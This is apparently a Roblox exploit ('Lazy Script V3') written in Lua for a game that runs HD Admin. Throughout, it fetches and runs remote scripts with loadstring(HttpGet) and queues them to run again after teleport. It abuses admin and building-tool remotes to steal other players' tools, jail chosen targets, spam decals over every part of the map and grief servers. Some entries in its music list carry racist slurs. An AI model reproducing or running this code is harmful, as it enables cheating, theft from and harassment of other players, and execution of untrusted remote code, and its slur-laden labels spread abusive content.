local SCRIPT_SOURCE = "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source" 

if getgenv().__LazyScriptWindow then
	pcall(function() getgenv().__LazyScriptWindow:Destroy() end)
	getgenv().__LazyScriptWindow = nil
	task.wait(0.3)
end

local Rayfield = loadstring(game:HttpGet("https://sirius.menu/gen2"))()

local window = Rayfield:CreateWindow({
	name = "Lazy Script V3 - Obby for Owner Admin",
	subtitle = "script owner String_Spirit, Credits to 0djey",
})

getgenv().__LazyScriptWindow = window

local TabMain = window:CreateTab({ name = "Main" })

TabMain:CreateSection({ name = "join discord for updates & sneak peeks" })

TabMain:CreateButton({
	name = "Discord Server",
	callback = function()
		local success, err = pcall(function()
			setclipboard("https://discord.gg/nDewGcyGAm")
		end)
		if success then
			window:Notify({ title = "Discord", content = "Copied Discord invite to clipboard!", duration = 3 })
		else
			window:Notify({ title = "Error", content = "Clipboard function not supported by executor.", duration = 3 })
		end
	end,
})

local function getBtools()
	local player = game.Players.LocalPlayer
	local tool = nil
	for _, v in player:GetDescendants() do
		if v.Name == "SyncAPI" then tool = v.Parent break end
	end
	if not tool then
		for _, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then tool = v.Parent break end
		end
	end
	if not tool then
		for _, v in game:GetDescendants() do
			if v.Name == "SyncAPI" then tool = v.Parent break end
		end
	end
	if not tool then return nil end
	return tool.SyncAPI.ServerEndpoint
end

TabMain:CreateSection({ name = "How to steal tool" })
TabMain:CreateSection({ name = "1. u need above mod rank first" })
TabMain:CreateSection({ name = "2. Get Gear steal item below" })
TabMain:CreateSection({ name = "3. shoot it to tool while they hold it" })
TabMain:CreateSection({ name = "4. they will drop tool then u can pick up it" })
TabMain:CreateSection({ name = "Tips: Aim it to their tool (don't aim body)" })
TabMain:CreateSection({ name = "Auto Steal Tools" })

TabMain:CreateButton({
	name = "Gear steal item - Mod+",
	callback = function()
		game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";gear me 95354288")
	end,
})

local lol = false

TabMain:CreateToggle({
	name = "Wtools Steal",
	value = false,
	callback = function(Value)
		lol = Value
		while lol do
			wait(0.1)
			if workspace:FindFirstChild("super cool wrench") then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace["super cool wrench"].Handle.CFrame
			end
		end
	end,
})

TabMain:CreateToggle({
	name = "Btools Steal",
	value = false,
	callback = function(Value)
		lol = Value
		while lol do
			wait(0.1)
			if workspace:FindFirstChild("Building Tools") then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace["Building Tools"].Handle.CFrame
			end
		end
	end,
})

TabMain:CreateToggle({
	name = "Fork3x Steal",
	value = false,
	callback = function(Value)
		lol = Value
		while lol do
			wait(0.1)
			if workspace:FindFirstChild("Fork3X") then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Fork3X.Handle.CFrame
			end
		end
	end,
})

do
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local ToolName = "super cool wrench"
	local Enabled = false
	local alreadyTeleported = {}

	local function teleportToPlayer(player)
		local myCharacter = LocalPlayer.Character
		local targetCharacter = player.Character
		if not myCharacter or not targetCharacter then return end
		local myHRP = myCharacter:FindFirstChild("HumanoidRootPart")
		local targetHRP = targetCharacter:FindFirstChild("HumanoidRootPart")
		if myHRP and targetHRP then
			myHRP.CFrame = targetHRP.CFrame + Vector3.new(3, 0, 0)
		end
	end

	local function watchCharacter(player, character)
		character.ChildAdded:Connect(function(child)
			if not Enabled then return end
			if alreadyTeleported[player] then return end
			if child:IsA("Tool") and child.Name == ToolName then
				alreadyTeleported[player] = true
				teleportToPlayer(player)
				print("Teleported to " .. player.Name)
			end
		end)
		character.ChildRemoved:Connect(function(child)
			if child:IsA("Tool") and child.Name == ToolName then
				alreadyTeleported[player] = false
			end
		end)
	end

	local function watchPlayer(player)
		if player.Character then watchCharacter(player, player.Character) end
		player.CharacterAdded:Connect(function(character)
			watchCharacter(player, character)
		end)
	end

	for _, player in pairs(Players:GetPlayers()) do
		if player ~= LocalPlayer then watchPlayer(player) end
	end
	Players.PlayerAdded:Connect(function(player)
		if player ~= LocalPlayer then watchPlayer(player) end
	end)

	TabMain:CreateToggle({
		name = "Auto TP To Super Cool Wrench Holder",
		value = false,
		callback = function(Value) Enabled = Value end,
	})
end

do
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local Backpack = LocalPlayer:WaitForChild("Backpack")
	local enabled = false
	local connections = {}
	local debounce = false

	local function activate(tool)
		if debounce then return end
		if not tool then return end
		if tool.Name ~= "super cool wrench" then return end
		local remote = tool:FindFirstChild("Place")
		if not remote then return end
		debounce = true
		local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
		local hrp = character:WaitForChild("HumanoidRootPart")
		local pos = hrp.Position + Vector3.new(0, 100, 0)
		remote:FireServer("pad", pos, { color = true, rank = "HeadAdmin" }, false)
		task.wait(0.2)
		debounce = false
	end

	local function connectSignals()
		local function hook(container)
			table.insert(connections, container.ChildAdded:Connect(function(child) activate(child) end))
			for _, child in ipairs(container:GetChildren()) do activate(child) end
		end
		hook(Backpack)
		local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
		hook(char)
		table.insert(connections, LocalPlayer.CharacterAdded:Connect(function(newChar) hook(newChar) end))
	end

	local function clearSignals()
		for _, c in ipairs(connections) do c:Disconnect() end
		table.clear(connections)
	end

	TabMain:CreateToggle({
		name = "Auto put Pad ur above - useful with steal gun",
		value = false,
		callback = function(Value)
			enabled = Value
			clearSignals()
			if not enabled then return end
			connectSignals()
		end,
	})
end

TabMain:CreateSection({ name = "auto touch admin pad" })

do
	local AutoCat = false
	TabMain:CreateToggle({
		name = "Auto Touch Pad",
		value = false,
		callback = function(Value)
			AutoCat = Value
			task.spawn(function()
				while AutoCat do
					local hrp = game.Players.LocalPlayer.Character
						and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					if hrp then
						for _, v in ipairs(workspace:GetDescendants()) do
							if v.Name == "admingiver" and v:IsA("BasePart") then
								firetouchinterest(hrp, v, 0)
								firetouchinterest(hrp, v, 1)
							end
						end
					end
					task.wait(0.1)
				end
			end)
		end,
	})
end

do
	local AutoTPPad = false
	TabMain:CreateToggle({
		name = "Auto Touch Pad [ Teleport ]",
		value = false,
		callback = function(Value)
			AutoTPPad = Value
			task.spawn(function()
				while AutoTPPad do
					local hrp = game.Players.LocalPlayer.Character
						and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					if hrp then
						for _, v in ipairs(workspace:GetDescendants()) do
							if not AutoTPPad then break end
							if v.Name == "admingiver" and v:IsA("BasePart") then
								hrp.CFrame = v.CFrame + Vector3.new(0, 3, 0)
								task.wait(0.3)
								firetouchinterest(hrp, v, 0)
								firetouchinterest(hrp, v, 1)
								task.wait(0.5)
							end
						end
					end
					task.wait(0.1)
				end
			end)
		end,
	})
end

TabMain:CreateSection({ name = "Misc" })

TabMain:CreateButton({
	name = "jerk off - sus",
	callback = function()
		loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))("Spider Script")
	end,
})

TabMain:CreateButton({
	name = "Portacell - Mod+ - op disable inventory tool",
	callback = function()
		game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";gear me 82357101")
	end,
})

TabMain:CreateSection({ name = "Tips: use invisible command before jail player" })

do
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local SelectedPlayer = nil

	local function GetPlayerList()
		local list = {}
		for _, plr in ipairs(Players:GetPlayers()) do
			if plr ~= LocalPlayer then table.insert(list, plr.Name) end
		end
		return list
	end

	local Dropdown = TabMain:CreateDropdown({
		name = "Target Player",
		options = GetPlayerList(),
		placeholder = "Select a player",
		callback = function(Value) SelectedPlayer = Value end,
	})

	Players.PlayerAdded:Connect(function() Dropdown:Refresh(GetPlayerList()) end)
	Players.PlayerRemoving:Connect(function() Dropdown:Refresh(GetPlayerList()) end)

	TabMain:CreateButton({
		name = "Auto Portacell",
		callback = function()
			if not SelectedPlayer then
				window:Notify({ title = "Error", content = "Select Player", duration = 3 })
				return
			end
			local Target = Players:FindFirstChild(SelectedPlayer)
			if Target and Target.Character and Target.Character:FindFirstChild("HumanoidRootPart") then
				local MyCharacter = LocalPlayer.Character
				local MyHRP = MyCharacter and MyCharacter:FindFirstChild("HumanoidRootPart")
				if MyHRP then
					MyHRP.CFrame = Target.Character.HumanoidRootPart.CFrame + Vector3.new(2, 0, 0)
					task.wait(0.3)
					local args = { Target.Character }
					LocalPlayer:WaitForChild("Backpack"):WaitForChild("PortableJustice"):WaitForChild("MouseClick"):FireServer(unpack(args))
				end
			end
		end,
	})

	local StarterGui = game:GetService("StarterGui")
	TabMain:CreateButton({
		name = "fix inventory from portacell",
		callback = function()
			pcall(function() StarterGui:SetCore("ResetButtonCallback", true) end)
			for _, guiType in ipairs(Enum.CoreGuiType:GetEnumItems()) do
				pcall(function() StarterGui:SetCoreGuiEnabled(guiType, true) end)
			end
		end,
	})
end

TabMain:CreateButton({
	name = "infinite yield",
	callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
	end,
})

TabMain:CreateButton({
	name = "Fix Fork3x",
	callback = function()
		task.spawn(function()

			if not workspace:FindFirstChild("donationboard") then
				local board = Instance.new("Model")
				board.Name = "donationboard"
				local b = Instance.new("Part")
				b.Name = "b"
				b.Anchored = true
				b.CanCollide = false
				b.Transparency = 1
				b.Size = Vector3.new(1,1,1)
				b.Position = Vector3.new(0, -100, 0) -- hide it far below map
				b.Parent = board
				local sg = Instance.new("SurfaceGui")
				sg.Parent = b
				local sf = Instance.new("ScrollingFrame")
				sf.Parent = sg
				board.Parent = workspace
				window:Notify({ title = "Fix Fork3x", content = "Fake donationboard created - re-equip Fork3x", duration = 4 })
			else
				window:Notify({ title = "Fix Fork3x", content = "donationboard already exists in workspace", duration = 3 })
			end
		end)
	end,
})

local AutoExecuteEnabled = false
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local placeId = 14753017334

local function doServerHop()
	local success, result = pcall(function()
		return HttpService:JSONDecode(
			game:HttpGet("https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=Asc&limit=100")
		)
	end)

	if not success or not result or not result.data then
		window:Notify({ title = "Server Hop", content = "Failed to fetch servers", duration = 3 })
		return
	end

	local currentJobId = game.JobId
	local servers = result.data
	local picked = nil

	for _, server in ipairs(servers) do
		if server.id ~= currentJobId and server.playing < server.maxPlayers then
			picked = server
			break
		end
	end

	if not picked then
		window:Notify({ title = "Server Hop", content = "No other servers found", duration = 3 })
		return
	end

	if AutoExecuteEnabled then
		local queueScript = [[loadstring(game:HttpGet("]] .. SCRIPT_SOURCE .. [[")()
		]]
		if queueteleport then
			queueteleport(queueScript)
		elseif queue_on_teleport then
			queue_on_teleport(queueScript)
		elseif syn and syn.queue_on_teleport then
			syn.queue_on_teleport(queueScript)
		end
	end

	window:Notify({ title = "Server Hop", content = "Hopping...", duration = 2 })
	TeleportService:TeleportToPlaceInstance(placeId, picked.id, game.Players.LocalPlayer)
end

TabMain:CreateButton({
	name = "Server Hop",
	callback = doServerHop,
})

do
	local networkPausedConn = nil

	TabMain:CreateToggle({
		name = "Remove Gameplay Paused",
		value = false,
		callback = function(Value)
			if Value then

				pcall(function()
					game:GetService("CoreGui").RobloxGui["CoreScripts/NetworkPause"]:Destroy()
				end)

				networkPausedConn = game:GetService("CoreGui").RobloxGui.ChildAdded:Connect(function(obj)
					if obj.Name == "CoreScripts/NetworkPause" then
						pcall(function() obj:Destroy() end)
					end
				end)
			else
				if networkPausedConn then
					networkPausedConn:Disconnect()
					networkPausedConn = nil
				end
			end
		end,
	})
end


do
	local HDEvent = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local UIS = game:GetService("UserInputService")
	local TweenService = game:GetService("TweenService")


	local ScreenGui = Instance.new("ScreenGui")
	ScreenGui.Name = "CustomCMDBAR2"
	ScreenGui.ResetOnSpawn = false
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	ScreenGui.DisplayOrder = 999

	local ok, hgui = pcall(function() return (gethui or get_hidden_gui)() end)
	if ok and hgui then
		ScreenGui.Parent = hgui
	else
		ScreenGui.Parent = game:GetService("CoreGui")
	end


	local Main = Instance.new("Frame")
	Main.Name = "Main"
	Main.Size = UDim2.new(0, 340, 0, 90)
	Main.Position = UDim2.new(0.5, -170, 0.08, 0)
	Main.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
	Main.BorderSizePixel = 0
	Main.Visible = false
	Main.Active = true
	Main.Parent = ScreenGui

	local Corner = Instance.new("UICorner")
	Corner.CornerRadius = UDim.new(0, 10)
	Corner.Parent = Main

	local Stroke = Instance.new("UIStroke")
	Stroke.Color = Color3.fromRGB(80, 60, 140)
	Stroke.Thickness = 1.5
	Stroke.Parent = Main

	local TopBar = Instance.new("Frame")
	TopBar.Name = "TopBar"
	TopBar.Size = UDim2.new(1, 0, 0, 28)
	TopBar.BackgroundColor3 = Color3.fromRGB(30, 22, 48)
	TopBar.BorderSizePixel = 0
	TopBar.Parent = Main

	local TopCorner = Instance.new("UICorner")
	TopCorner.CornerRadius = UDim.new(0, 10)
	TopCorner.Parent = TopBar


	local BottomFix = Instance.new("Frame")
	BottomFix.Size = UDim2.new(1, 0, 0, 10)
	BottomFix.Position = UDim2.new(0, 0, 1, -10)
	BottomFix.BackgroundColor3 = Color3.fromRGB(30, 22, 48)
	BottomFix.BorderSizePixel = 0
	BottomFix.Parent = TopBar

	local TitleLabel = Instance.new("TextLabel")
	TitleLabel.Size = UDim2.new(1, -40, 1, 0)
	TitleLabel.Position = UDim2.new(0, 12, 0, 0)
	TitleLabel.BackgroundTransparency = 1
	TitleLabel.Text = "HD Admin CMD"
	TitleLabel.TextColor3 = Color3.fromRGB(200, 170, 255)
	TitleLabel.Font = Enum.Font.GothamBold
	TitleLabel.TextSize = 13
	TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
	TitleLabel.Parent = TopBar

	local CloseBtn = Instance.new("TextButton")
	CloseBtn.Size = UDim2.new(0, 22, 0, 22)
	CloseBtn.Position = UDim2.new(1, -26, 0, 3)
	CloseBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 80)
	CloseBtn.BorderSizePixel = 0
	CloseBtn.Text = "X"
	CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	CloseBtn.Font = Enum.Font.GothamBold
	CloseBtn.TextSize = 11
	CloseBtn.Parent = TopBar
	Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 6)

	local InputFrame = Instance.new("Frame")
	InputFrame.Size = UDim2.new(1, -20, 0, 34)
	InputFrame.Position = UDim2.new(0, 10, 0, 36)
	InputFrame.BackgroundColor3 = Color3.fromRGB(28, 24, 40)
	InputFrame.BorderSizePixel = 0
	InputFrame.Parent = Main
	Instance.new("UICorner", InputFrame).CornerRadius = UDim.new(0, 8)

	local InputStroke = Instance.new("UIStroke")
	InputStroke.Color = Color3.fromRGB(90, 60, 160)
	InputStroke.Thickness = 1
	InputStroke.Parent = InputFrame


    local PrefixLabel = Instance.new("TextLabel")
	PrefixLabel.Size = UDim2.new(0, 22, 1, 0)
	PrefixLabel.Position = UDim2.new(0, 6, 0, 0)
	PrefixLabel.BackgroundTransparency = 1
	PrefixLabel.Text = ";"
	PrefixLabel.TextColor3 = Color3.fromRGB(160, 120, 255)
	PrefixLabel.Font = Enum.Font.GothamBold
	PrefixLabel.TextSize = 16
	PrefixLabel.TextXAlignment = Enum.TextXAlignment.Left
	PrefixLabel.Parent = InputFrame

	local CmdInput = Instance.new("TextBox")
	CmdInput.Size = UDim2.new(1, -100, 1, 0)
	CmdInput.Position = UDim2.new(0, 26, 0, 0)
	CmdInput.BackgroundTransparency = 1
	CmdInput.PlaceholderText = "Type a command..."
	CmdInput.PlaceholderColor3 = Color3.fromRGB(100, 80, 130)
	CmdInput.Text = ""
	CmdInput.TextColor3 = Color3.fromRGB(230, 220, 255)
	CmdInput.Font = Enum.Font.Gotham
	CmdInput.TextSize = 13
	CmdInput.TextXAlignment = Enum.TextXAlignment.Left
	CmdInput.ClearTextOnFocus = false
	CmdInput.Parent = InputFrame

	local ExecBtn = Instance.new("TextButton")
	ExecBtn.Size = UDim2.new(0, 66, 0, 26)
	ExecBtn.Position = UDim2.new(1, -70, 0, 4)
	ExecBtn.BackgroundColor3 = Color3.fromRGB(100, 60, 200)
	ExecBtn.BorderSizePixel = 0
	ExecBtn.Text = "Execute"
	ExecBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	ExecBtn.Font = Enum.Font.GothamBold
	ExecBtn.TextSize = 12
	ExecBtn.Parent = InputFrame
	Instance.new("UICorner", ExecBtn).CornerRadius = UDim.new(0, 6)

	-- hint label
	local HintLabel = Instance.new("TextLabel")
	HintLabel.Size = UDim2.new(1, -20, 0, 16)
	HintLabel.Position = UDim2.new(0, 10, 0, 72)
	HintLabel.BackgroundTransparency = 1
	HintLabel.Text = "Enter without prefix  •  supports all HD Admin commands"
	HintLabel.TextColor3 = Color3.fromRGB(100, 80, 130)
	HintLabel.Font = Enum.Font.Gotham
	HintLabel.TextSize = 10
	HintLabel.TextXAlignment = Enum.TextXAlignment.Left
	HintLabel.Parent = Main

	-- Execute logic
	local function executeCmd()
		local raw = CmdInput.Text
		if raw == "" then return end
		-- strip any leading prefix chars the user may have typed
		local stripped = raw:match("^[;:/!%%#@%$%%^&%*%-=+~`|%\\]+(.+)$") or raw
		stripped = stripped:match("^%s*(.-)%s*$") -- trim whitespace
		if stripped == "" then return end
		pcall(function()
			HDEvent:InvokeServer(";" .. stripped)
		end)
		-- flash the button green
		TweenService:Create(ExecBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(40, 180, 80)}):Play()
		task.delay(0.4, function()
			TweenService:Create(ExecBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(100, 60, 200)}):Play()
		end)
	end

	ExecBtn.MouseButton1Click:Connect(executeCmd)

	CmdInput.FocusLost:Connect(function(enter)
		if enter then executeCmd() end
	end)

	CloseBtn.MouseButton1Click:Connect(function()
		Main.Visible = false
	end)

	-- Dragging
	local dragging, dragStart, startPos
	TopBar.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = Main.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then dragging = false end
			end)
		end
	end)
	TopBar.InputChanged:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and dragging then
			local delta = input.Position - dragStart
			Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		end
	end)

	TabMain:CreateButton({
		name = "Custom CMDBAR2",
		callback = function()
			Main.Visible = not Main.Visible
			if Main.Visible then
				CmdInput:CaptureFocus()
			end
		end,
	})
end


local TabMusic = window:CreateTab({ name = "Music" })
TabMusic:CreateSection({ name = "u need Admin+" })

local function Music(id)
	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";music " .. id .. " ;volume 10")
end

local function HDMusic(cmd)
	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(cmd)
end

local musicTracks = {
	{ name = "Spooky skeleton",              cmd = ";music 104181508980428 ;pitch 0.2 ;volume 10" },
	{ name = "Spooky skeleton 2",            id  = "100828050594137" },
	{ name = "Through Patches of Violet",    id  = "77579718926500" },
	{ name = "Blend W",                      id  = "87824870129318" },
	{ name = "Golden hour",                  id  = "136409279011083" },
	{ name = "Jumpstyle",                    id  = "75522197868449" },
	{ name = "2004 bootleg",                 id  = "135881205397136" },
	{ name = "Crypt dust",                   id  = "138397903891342" },
	{ name = "laserstyle mix",               id  = "72205284895340" },
	{ name = "Nyancat",                      cmd = ";music 78152030908975 ;volume 10" },
	{ name = "OI OI OI EYE FUNK",               cmd = ";music 137215969559232 ;volume 10" },
	{ name = "bubble",                       cmd = ";music 128961712071619 ;volume 10" },
	{ name = "Lamors tonjour",               cmd = ";music 138421944471718 ;volume 10" },
	{ name = "Night of nights",              cmd = ";music 93489304289517 ;volume 10" },
	{ name = "Infinite Void",                cmd = ";music 131649240815291 ;volume 10" },
	{ name = "Jujutsu kaisen Todo",          cmd = ";music 103838195310017 ;volume 10" },
	{ name = "Obunga",                       cmd = ";music 130351568910729 ;volume 10 ;pitch 0.1" },
	{ name = "Horror Movie",                 cmd = ";music 72504072770543 ;volume 10" },
	{ name = "Toma Toma",                    cmd = ";music 89180400948567 ;volume 10" },
	{ name = "KJ",                           cmd = ";music 96096795516863 ;volume 10" },
	{ name = "idk",                          cmd = ";music 9041745502 ;volume 10" },
	{ name = "smooth criminal - michelle jackson", cmd = ";music 101531774453154 ;volume 10" },
	{ name = "Won't Stop Us C",              cmd = ";music 1847661821 ;volume 10" },
	{ name = "Jumpstyle 2",                  cmd = ";music 1839246711 ;volume 10" },
	{ name = "thomas",                       cmd = ";music 89039427227856 ;volume 10 ;pitch 0.1" },
	{ name = "the abyss",                    cmd = ";music 92199602729478 ;volume 10" },
	{ name = "ni-- remix",                   cmd = ";music 116925459199971 ;volume 10 ;pitch 0.1" },
	{ name = "Miku",                         cmd = ";music 94546418776271 ;volume 10" },
	{ name = "Subway Surfers",               cmd = ";music 103620006912519 ;volume 10" },
	{ name = "Re:zero English",              cmd = ";music 88014054894895 ;volume 10" },
	{ name = "Ai song",                      cmd = ";music 94715018676012 ;volume 10" },
	{ name = "Chainsaw man - iris out",      cmd = ";music 88116925875362 ;volume 10" },
	{ name = "Chainsaw man - Kick back",     cmd = ";music 94110452996090 ;volume 10" },
	{ name = "Mario",                        cmd = ";music 124143766633529 ;volume 10" },
	{ name = "Mario tomato",                 id  = "118761863682498" },
	{ name = "Paradise - very loud",         id  = "128048502331483" },
	{ name = "Verity",                       id  = "116704489332329" },
	{ name = "Relaxed Scene",             cmd = ";music 1848354536 ;volume 10" },
	{ name = "Life in an Elevator",       cmd = ";music 1841647093 ;volume 10" },
	{ name = "i love israel",             id = "96844180792603"},
	{ name = "perfect face",              id = "130287388520026"},
	{ name = "unhappy s0rrow",            id = "88523902860927"},
	{ name = "homer let the russians out",            id = "83203007766703"},
	{ name = "really sus sound",                           id = "104149742068405"},
	{ name = "fuck all niggas",                           cmd = ";music 99993460719133 ;pitch 0.2"},
	{ name = "1945 germany",                           id = "108267211827921"},
	{ name = "smoke weed everyday",                           id = "6717030010"},

}

for _, track in ipairs(musicTracks) do
	local t = track
	TabMusic:CreateButton({
		name = t.name,
		callback = function()
			if t.cmd then HDMusic(t.cmd)
			else Music(t.id) end
		end,
	})
end


local TabDecal = window:CreateTab({ name = "Decal spam" })
TabDecal:CreateSection({ name = "u need btools in inventory but dont hold in hands" })

local FACES = {
	Enum.NormalId.Front,
	Enum.NormalId.Back,
	Enum.NormalId.Left,
	Enum.NormalId.Right,
	Enum.NormalId.Top,
	Enum.NormalId.Bottom,
}

local function spamDecal(assetId)
	task.spawn(function()
		local remote = getBtools()
		if not remote then
			window:Notify({ title = "Error", content = "Need btools in inventory", duration = 3 })
			return
		end

		local textureUrl = "rbxassetid://" .. tostring(assetId)

		for _, part in workspace:GetDescendants() do
			if part:IsA("BasePart") then
				task.spawn(function()
					pcall(function()
						remote:InvokeServer("SetLocked", { part }, false)
					end)
					for _, face in ipairs(FACES) do
						pcall(function()
							remote:InvokeServer("CreateTextures", {
								{ Part = part, Face = face, TextureType = "Decal" }
							})
						end)
						pcall(function()
							remote:InvokeServer("SyncTexture", {
								{ Part = part, Face = face, TextureType = "Decal", Texture = textureUrl }
							})
						end)
					end
				end)
			end
		end
	end)
end

local decals = {
	{ name = "c00lkidd",                  id = "81249587601716" },
	{ name = "Snoop dogg",                id = "880017279" },
	{ name = "Giorno Giovanna",           id = "134574472097973" },
	{ name = "Nuke",                      id = "749988576" },
	{ name = "Clear Decal",               id = "1" },
	{ name = "Nyancat",                   id = "10812247949" },
	{ name = "Russia",                    id = "2306030162" },
	{ name = "Teto",                      id = "81398250291567" },
	{ name = "Jumpscare",                 id = "9565121852" },
	{ name = "Night of nights",           id = "7497933908" },
	{ name = "Star rail sparxie",         id = "120813702869341" },
	{ name = "kanye west",                id = "7371693428" },
	{ name = "Infinite void",             id = "6938945464" },
	{ name = "JJK",                       id = "121395544903127" },
	{ name = "JJK Todo",                  id = "91504556474159" },
	{ name = "Obama",                     id = "3137451504" },
	{ name = "Obunga",                    id = "10665646504" },
	{ name = "steak with popcorn butter?",id = "86603351709863" },
	{ name = "kj",                        id = "125476020386823" },
	{ name = "Evernight",                 id = "108963831426567" },
	{ name = "fake peppino",              id = "79736862379383" },
	{ name = "Michelle Jackson",          id = "2458871868" },
	{ name = "S tier Crasher",            id = "75534856771408" },
	{ name = "thomas",                    id = "180674842" },
	{ name = "Miku",                      id = "6286207073" },
	{ name = "Subway Surfers",            id = "13963674056" },
	{ name = "Re:Zero",                   id = "5560834894" },
	{ name = "Ai horror",                 id = "12087309466" },
	{ name = "Reze",                      id = "71720378084802" },
	{ name = "Chainsaw man - Denji",      id = "11460669114" },
	{ name = "Mario",                     id = "2232731191" },
	{ name = "Mario tomato",              id = "102295548513065" },
	{ name = "explosion",                 id = "366288920" },
	{ name = "GOD Tycoon",                id = "6673967738" },
	{ name = "juangamer62",               id = "6319951708" },
	{ name = "Roblox",                    id = "72787296931257" },
	{ name = "David Baszucki Horror 1",   id = "140080445232377" },
	{ name = "David Baszucki Horror 2",   id = "139537607794162" },
	{ name = "David Baszucki Horror 3",   id = "103248992533619" },
	{ name = "David Baszucki Horror 4",   id = "135425852209288" },
	{ name = "Robux",                     id = "11560341824" },
	{ name = "Tel Aviv",                  id = "104332184280020" },
	{ name = "Israel",                    id = "7940780144" },
	{ name = "jord404",                   id = "15011943540" },
	{ name = "Luffy",                     id = "10511855986" },
	{ name = "pewdienoob",                id = "4705269490" },
    { name = "oi oi oi larva",            id = "17234656389" },
	{ name = "smolheaddidntask",          id = "79294638258952" },
}

for _, d in ipairs(decals) do
	local did = d.id
	TabDecal:CreateButton({
		name = d.name,
		callback = function() spamDecal(did) end,
	})
end


local TabSkybox = window:CreateTab({ name = "Skybox, Base" })

TabSkybox:CreateButton({
	name = "smolhead skybox",
	callback = function()
		task.spawn(function()
			local remote = getBtools()
			if not remote then
				window:Notify({ title = "Error", content = "Need btools in inventory", duration = 3 })
				return
			end
			local char = game.Players.LocalPlayer.Character
			if not char then return end
			local hrp = char:FindFirstChild("HumanoidRootPart")
			if not hrp then return end

			local e = math.floor(hrp.CFrame.x)
			local f = math.floor(hrp.CFrame.y)
			local g = math.floor(hrp.CFrame.z)

			local part = remote:InvokeServer("CreatePart", "Normal", CFrame.new(e, f + 6, g), workspace)
			if not part then
				window:Notify({ title = "Error", content = "CreatePart returned nil", duration = 3 })
				return
			end

			task.wait(0.1)
			remote:InvokeServer("SetName",      { part }, "Sky")
			remote:InvokeServer("CreateMeshes", { { Part = part } })
			remote:InvokeServer("SyncMesh",     { { Part = part, MeshId    = "rbxassetid://111891702759441" } })
			remote:InvokeServer("SyncMesh",     { { Part = part, TextureId = "rbxassetid://79294638258952" } })
			remote:InvokeServer("SyncMesh",     { { Part = part, Scale     = Vector3.new(1000, 1000, 1000) } })
			remote:InvokeServer("SetLocked",    { part }, true)
		end)
	end,
})

TabSkybox:CreateButton({
	name = "Baseplate",
	callback = function()
		task.spawn(function()
			local remote = getBtools()
			if not remote then
				window:Notify({ title = "Error", content = "Need btools in inventory", duration = 3 })
				return
			end
			local char = game.Players.LocalPlayer.Character
			if not char then return end
			local hrp = char:FindFirstChild("HumanoidRootPart")
			if not hrp then return end

			local hrpx = math.floor(hrp.CFrame.x)
			local hrpz = math.floor(hrp.CFrame.z)
			local hrpy = math.floor(hrp.CFrame.y)

			local part = remote:InvokeServer("CreatePart", "Spawn", CFrame.new(hrpx, hrpy - 20, hrpz), workspace)
			if not part then return end

			task.wait(0.1)
			remote:InvokeServer("SyncResize",     { { Part = part, CFrame = CFrame.new(hrpx, hrpy - 20, hrpz), Size = Vector3.new(100, 12, 100) } })
			remote:InvokeServer("SyncColor",      { { Part = part, Color = Color3.fromRGB(121, 125, 127), UnionColoring = false } })
			remote:InvokeServer("CreateTextures", { { Part = part, Face = Enum.NormalId.Top, TextureType = "Texture" } })

			while task.wait(1) do
				pcall(function() remote:InvokeServer("SetLocked", { part }, true) end)
			end
		end)
	end,
})


local TabMove = window:CreateTab({ name = "Move, TP" })

do
	local UIS = game:GetService("UserInputService")
	local Players = game:GetService("Players")
	local InfiniteJumpEnabled = false
	local JumpConnection

	TabMove:CreateToggle({
		name = "Infinite Jump",
		value = false,
		callback = function(state)
			InfiniteJumpEnabled = state
			if state then
				if JumpConnection then JumpConnection:Disconnect() end
				JumpConnection = UIS.JumpRequest:Connect(function()
					if InfiniteJumpEnabled then
						local char = Players.LocalPlayer.Character
						local hum = char and char:FindFirstChildOfClass("Humanoid")
						if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
					end
				end)
			elseif JumpConnection then
				JumpConnection:Disconnect()
				JumpConnection = nil
			end
		end,
	})
end

do
	local Players = game:GetService("Players")
	local Player = Players.LocalPlayer
	local SpeedEnabled = false
	local SpeedValue = 16

	local function UpdateSpeed()
		local Character = Player.Character
